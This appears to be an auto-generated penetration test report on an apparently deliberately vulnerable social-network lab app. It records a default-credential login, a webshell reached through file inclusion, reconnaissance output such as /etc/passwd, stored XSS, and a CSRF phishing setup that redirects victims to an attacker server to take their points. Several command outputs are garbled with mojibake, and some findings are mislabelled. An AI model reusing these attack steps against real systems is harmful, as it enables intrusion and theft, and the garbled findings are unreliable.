# Security Assessment Report

## Executive Summary

| Item | Value |
|------|-------|
| **Target** | `http://52.78.221.104` |
| **Attacker Server** | `http://13.158.67.78:5000` |
| **Assessment Date** | 2025-11-10 12:46:59 |
| **Duration** | 91 seconds |
| **Tool Version** | v2.0-evasion |

---

## Vulnerability Summary

| Severity | Count |
|----------|-------|
| ğŸ”´ **CRITICAL** (CVSS â‰¥ 9.0) | 2 |
| ğŸŸ  **HIGH** (CVSS 7.0-8.9) | 3 |
| **Total Vulnerabilities** | 5 |

---

## Detailed Findings

### 1. SQL Injection Vulnerabilities

#### SQL Injection #1: Default credentials still active

**CVSS Score:** 7.5 (CRITICAL)

**Details:**
- **Target URL:** `http://52.78.221.104/login.php`
- **Username Payload:** `admin`
- **Password Payload:** `admin123`

**Impact:**
HIGH - Unauthorized access with default credentials

**Remediation:**
- Use prepared statements or parameterized queries
- Implement input validation and sanitization
- Use ORM frameworks
- Apply principle of least privilege for database accounts
- Implement WAF rules to detect SQL injection patterns

---

### 2. File Upload Vulnerabilities

#### File Upload RCE #1

**CVSS Score:** 10.0 (CRITICAL)

**Details:**
- **Upload URL:** `http://52.78.221.104/upload.php`
- **Uploaded File:** `shell.jpg`
- **Access URL:** `http://52.78.221.104/file.php?name=shell.jpg&cmd={COMMAND}`
- **Access Method:** Via file.php LFI

**Proof of Concept:**
```bash
# Test command executed
whoami
```

**Output:**
```
apacheLFI ê³µê²© ê°€ì´ë“œLFI ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ì˜ˆì œ:1. ê¸°ë³¸ LFI (ì°¨ë‹¨ë¨):file.php?name=../../../etc/passwd âŒ2. ìš°íšŒ ë°©ë²• - ../ ë‘ ë²ˆë§Œ ì‚¬ìš©:file.php?name=../../etc/passwd âœ…file.php?name=../../etc/hosts âœ…file.php?name=../config.php âœ…3. ...
```

**Impact:**
CRITICAL - Remote Code Execution achieved

**Remediation:**
- Implement strict file type validation (whitelist approach)
- Rename uploaded files with random names
- Store uploads outside web root
- Disable script execution in upload directories
- Scan uploaded files for malware
- Implement file size limits

---

### 3. Local File Inclusion & Remote Code Execution

#### Remote Code Execution #1

**CVSS Score:** 10.0 (CRITICAL)

**Details:**
- **Vulnerable URL:** `http://52.78.221.104/file.php`
- **Webshell:** `shell.jpg`
- **Commands Executed:** 19

**Reconnaissance Results:**

##### Current user
```bash
$ whoami
```
<details>
<summary>Output (click to expand)</summary>

```
apacheLFI ê³µê²© ê°€ì´ë“œLFI ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ì˜ˆì œ:1. ê¸°ë³¸ LFI (ì°¨ë‹¨ë¨):file.php?name=../../../etc/passwd âŒ2. ìš°íšŒ ë°©ë²• - ../ ë‘ ë²ˆë§Œ ì‚¬ìš©:file.php?name=../../etc/passwd âœ…file.php?name=../../etc/hosts âœ…file.php?name=../config.php âœ…3. ì ˆëŒ€ ê²½ë¡œ ì‚¬ìš©:file.php?name=/etc/passwd âœ…file.php?name=/var/www/html/config.php âœ…4. ì›¹ì‰˜ ì‹¤í–‰ (ì—…ë¡œë“œí•œ .php5 íŒŒì¼):file.php?name=shell.php5&cmd=whoami âœ…file.php?name=shell.php5&cmd=ls -la âœ…file.php?name=shell.php5&cmd=cat /etc/passwd âœ…5. ë¯¼ê°í•œ íŒŒì¼ ì½ê¸°:file.php?name=../../config.php (DB ì •ë³´)file.php?name=/var/log/apach
```
</details>

##### User ID and groups
```bash
$ id
```
<details>
<summary>Output (click to expand)</summary>

```
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0LFI ê³µê²© ê°€ì´ë“œLFI ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ì˜ˆì œ:1. ê¸°ë³¸ LFI (ì°¨ë‹¨ë¨):file.php?name=../../../etc/passwd âŒ2. ìš°íšŒ ë°©ë²• - ../ ë‘ ë²ˆë§Œ ì‚¬ìš©:file.php?name=../../etc/passwd âœ…file.php?name=../../etc/hosts âœ…file.php?name=../config.php âœ…3. ì ˆëŒ€ ê²½ë¡œ ì‚¬ìš©:file.php?name=/etc/passwd âœ…file.php?name=/var/www/html/config.php âœ…4. ì›¹ì‰˜ ì‹¤í–‰ (ì—…ë¡œë“œí•œ .php5 íŒŒì¼):file.php?name=shell.php5&cmd=whoami âœ…file.php?name=shell.php5&cmd=ls -la âœ…file.php?name=shell.php5&cmd=cat /etc/passwd âœ…5
```
</details>

##### Current directory
```bash
$ pwd
```
<details>
<summary>Output (click to expand)</summary>

```
/var/www/html/wwwLFI ê³µê²© ê°€ì´ë“œLFI ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ì˜ˆì œ:1. ê¸°ë³¸ LFI (ì°¨ë‹¨ë¨):file.php?name=../../../etc/passwd âŒ2. ìš°íšŒ ë°©ë²• - ../ ë‘ ë²ˆë§Œ ì‚¬ìš©:file.php?name=../../etc/passwd âœ…file.php?name=../../etc/hosts âœ…file.php?name=../config.php âœ…3. ì ˆëŒ€ ê²½ë¡œ ì‚¬ìš©:file.php?name=/etc/passwd âœ…file.php?name=/var/www/html/config.php âœ…4. ì›¹ì‰˜ ì‹¤í–‰ (ì—…ë¡œë“œí•œ .php5 íŒŒì¼):file.php?name=shell.php5&cmd=whoami âœ…file.php?name=shell.php5&cmd=ls -la âœ…file.php?name=shell.php5&cmd=cat /etc/passwd âœ…5. ë¯¼ê°í•œ íŒŒì¼ ì½ê¸°:file.php?name=../../config.php (DB ì •ë³´)file.php?name=/va
```
</details>

##### Directory listing
```bash
$ ls -la
```
<details>
<summary>Output (click to expand)</summary>

```
total 144
drwxr-xr-x. 3 ec2-user ec2-user 16384 Nov 10 11:38 .
drwxrwxrwx. 4 root     root       138 Nov  7 14:37 ..
-rw-r--r--. 1 ec2-user ec2-user   536 Oct 27 06:20 add_comment.php
-rw-r--r--. 1 root     apache    1861 Nov 10 11:28 config.php
-rw-r--r--. 1 root     root      1534 Nov  3 17:12 config.php.bak
-rw-r--r--. 1 ec2-user ec2-user   817 Oct 27 06:22 download.php
-rw-r--r--. 1 ec2-user ec2-user  7228 Oct 27 06:22 file.php
-rw-rw-r--. 1 ec2-user ec2-user  8605 Nov 10 11:38 index.php
-rw
```
</details>

##### User accounts
```bash
$ cat /etc/passwd
```
<details>
<summary>Output (click to expand)</summary>

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kern
```
</details>

##### Group information
```bash
$ cat /etc/group
```
<details>
<summary>Output (click to expand)</summary>

```
root:x:0:
bin:x:1:
daemon:x:2:
sys:x:3:
adm:x:4:ec2-user
tty:x:5:
disk:x:6:
lp:x:7:
mem:x:8:
kmem:x:9:
wheel:x:10:ec2-user,hongjungsu,teamlead
cdrom:x:11:
mail:x:12:
man:x:15:
dialout:x:18:
floppy:x:19:
games:x:20:
tape:x:33:
video:x:39:
ftp:x:50:
lock:x:54:
audio:x:63:
users:x:100:
nobody:x:65534:
utmp:x:22:
utempter:x:35:
dbus:x:81:
input:x:104:
kvm:x:36:
render:x:105:
sgx:x:106:
systemd-journal:x:190:ec2-user
systemd-network:x:192:
systemd-oom:x:999:
systemd-resolve:x:193:
ssh_keys:x:998:
ssh
```
</details>

##### System information
```bash
$ uname -a
```
<details>
<summary>Output (click to expand)</summary>

```
Linux ip-172-31-40-109.ap-northeast-2.compute.internal 6.1.155-176.282.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Oct  7 15:53:25 UTC 2025 x86_64 x86_64 x86_64 GNU/LinuxLFI ê³µê²© ê°€ì´ë“œLFI ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ì˜ˆì œ:1. ê¸°ë³¸ LFI (ì°¨ë‹¨ë¨):file.php?name=../../../etc/passwd âŒ2. ìš°íšŒ ë°©ë²• - ../ ë‘ ë²ˆë§Œ ì‚¬ìš©:file.php?name=../../etc/passwd âœ…file.php?name=../../etc/hosts âœ…file.php?name=../config.php âœ…3. ì ˆëŒ€ ê²½ë¡œ ì‚¬ìš©:file.php?name=/etc/passwd âœ…file.php?name=/var/www/html/config.php âœ…4. ì›¹ì‰˜ ì‹¤í–‰ (ì—…ë¡œë“œí•œ .php5 íŒŒì¼):file.php?name=shell.php5&cmd=whoami 
```
</details>

##### OS version
```bash
$ cat /etc/os-release
```
<details>
<summary>Output (click to expand)</summary>

```
NAME="Amazon Linux"
VERSION="2023"
ID="amzn"
ID_LIKE="fedora"
VERSION_ID="2023"
PLATFORM_ID="platform:al2023"
PRETTY_NAME="Amazon Linux 2023.9.20251020"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2023"
HOME_URL="https://aws.amazon.com/linux/amazon-linux-2023/"
DOCUMENTATION_URL="https://docs.aws.amazon.com/linux/"
SUPPORT_URL="https://aws.amazon.com/premiumsupport/"
BUG_REPORT_URL="https://github.com/amazonlinux/amazon-linux-2023"
VENDOR_NAME="AWS"
VENDOR_URL="https://aws.amazon.c
```
</details>

##### Environment variables
```bash
$ env
```
<details>
<summary>Output (click to expand)</summary>

```
PWD=/var/www/html/www
HOME=/usr/share/httpd
USER=apache
SHLVL=0
_=/usr/bin/envLFI ê³µê²© ê°€ì´ë“œLFI ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ì˜ˆì œ:1. ê¸°ë³¸ LFI (ì°¨ë‹¨ë¨):file.php?name=../../../etc/passwd âŒ2. ìš°íšŒ ë°©ë²• - ../ ë‘ ë²ˆë§Œ ì‚¬ìš©:file.php?name=../../etc/passwd âœ…file.php?name=../../etc/hosts âœ…file.php?name=../config.php âœ…3. ì ˆëŒ€ ê²½ë¡œ ì‚¬ìš©:file.php?name=/etc/passwd âœ…file.php?name=/var/www/html/config.php âœ…4. ì›¹ì‰˜ ì‹¤í–‰ (ì—…ë¡œë“œí•œ .php5 íŒŒì¼):file.php?name=shell.php5&cmd=whoami âœ…file.php?name=shell.php5&cmd=ls -la âœ…file.php?name=shell.php5&cmd=cat /etc/passwd âœ…5. ë¯¼ê°í•œ 
```
</details>

##### Running processes
```bash
$ ps aux
```
<details>
<summary>Output (click to expand)</summary>

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.4 172432 17440 ?        Ss   08:56   0:03 /usr/lib/systemd/systemd --switched-root --system --deserialize=32
root           2  0.0  0.0      0     0 ?        S    08:56   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   08:56   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   08:56   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   08:
```
</details>

**Impact:**
CRITICAL - Full system access, privilege escalation possible

**Remediation:**
- Immediately remove all uploaded webshells
- Disable file upload functionality or implement strict validation
- Configure web server to not execute scripts in upload directories
- Implement input validation for file inclusion parameters
- Use whitelist-based file path validation
- Enable and configure mod_security or similar WAF

---

### 4. XSS & CSRF Vulnerabilities

#### XSS/CSRF #1

**CVSS Score:** 7.5

**Details:**
- **Vulnerable URL:** `http://52.78.221.104/new_post.php`
- **Attack Type:** stored_xss

**Impact:**
HIGH - JavaScript execution in victim browsers, session hijacking possible

**Remediation:**
- Implement CSRF tokens for all state-changing operations
- Use Content-Security-Policy headers
- Sanitize and validate all user inputs
- Implement HTTPOnly and Secure flags on cookies
- Use X-Frame-Options to prevent clickjacking

---

#### XSS/CSRF #2

**CVSS Score:** 8.8

**Details:**
- **Vulnerable URL:** `http://52.78.221.104/new_post.php`
- **Attack Type:** phishing_csrf

**Impact:**
CRITICAL - CSRF allows unauthorized actions on behalf of victim

**Remediation:**
- Implement CSRF tokens for all state-changing operations
- Use Content-Security-Policy headers
- Sanitize and validate all user inputs
- Implement HTTPOnly and Secure flags on cookies
- Use X-Frame-Options to prevent clickjacking

---

## Attack Timeline

| Time | Event | Severity | Details |
|------|-------|----------|---------|
| 2025-11-10 12:46:59 | SCAN_START | INFO | Security assessment started on http://52.78.221.10... |
| 2025-11-10 12:47:14 | WEAK_CREDENTIALS | HIGH | Logged in with default credentials: admin/admin123... |
| 2025-11-10 12:47:23 | FILE_UPLOAD_RCE | CRITICAL | Successfully uploaded webshell: shell.jpg... |
| 2025-11-10 12:48:13 | RCE | CRITICAL | Remote Code Execution achieved via shell.jpg... |
| 2025-11-10 12:48:22 | STORED_XSS | HIGH | Stored XSS vulnerability confirmed: Basic script t... |
| 2025-11-10 12:48:31 | CSRF_PHISHING | CRITICAL | Malicious CSRF phishing post created: Direct link ... |
| 2025-11-10 12:48:31 | SETUP | INFO | Generated fake-gift.html attack page... |
| 2025-11-10 12:48:31 | SCAN_COMPLETE | INFO | Security assessment completed. 5 vulnerabilities f... |


---

## Immediate Actions Required

### ğŸ”´ Critical Priority
1. **Remove all uploaded webshells** - File: `shell.jpg`
2. **Patch SQL Injection vulnerabilities** - Block unauthenticated access
3. **Disable or secure file upload functionality**
4. **Review all user accounts** - Check for unauthorized access

### ğŸŸ  High Priority
1. Implement input validation and sanitization across the application
2. Configure Web Application Firewall (WAF)
3. Enable security headers (CSP, X-Frame-Options, etc.)
4. Implement proper session management
5. Review and update all dependencies

### ğŸŸ¡ Medium Priority
1. Implement rate limiting
2. Enable detailed security logging
3. Conduct security code review
4. Implement automated security testing
5. Perform penetration testing on regular basis

---

## CSRF Attack Setup (For Testing)

**Attacker Server Setup:**
```bash
# 1. Start Flask server
python3 attacker_server.py

# 2. Access fake-gift.html
open reports/fake-gift.html
```

**Expected Attack Flow:**
1. Victim views malicious post
2. Victim clicks phishing link
3. Browser redirects to `http://13.158.67.78:5000/fake-gift`
4. CSRF attack executes automatically
5. Victim's points transferred to attacker

**Monitor Dashboard:**
- URL: `http://13.158.67.78:5000/`
- Logs: Check Flask console output

---

## Technical Details

### System Information
- **Current User:** apache (uid=48)
- **Working Directory:** /var/www/html/www
- **OS:** Amazon Linux 2023
- **Kernel:** 6.1.155-176.282.amzn2023.x86_64

### Discovered Users
- ec2-user
- hongjungho
- hongjungsu

### Running Services
- PostgreSQL (127.0.0.1:5432)
- Apache HTTP Server
- Systemd services

---

## Conclusion

This assessment identified **5 critical vulnerabilities** in the target application, including:
- SQL Injection allowing authentication bypass
- Remote Code Execution through file upload
- Multiple privilege escalation vectors

**Overall Risk Rating:** ğŸ”´ **CRITICAL**

Immediate remediation is strongly recommended to prevent unauthorized access and data breaches.

---

*Report generated by VulnerableSNS Security Assessment Tool v2.0-evasion*
*Assessment completed at: 2025-11-10 12:48:31*
*Duration: 91 seconds*
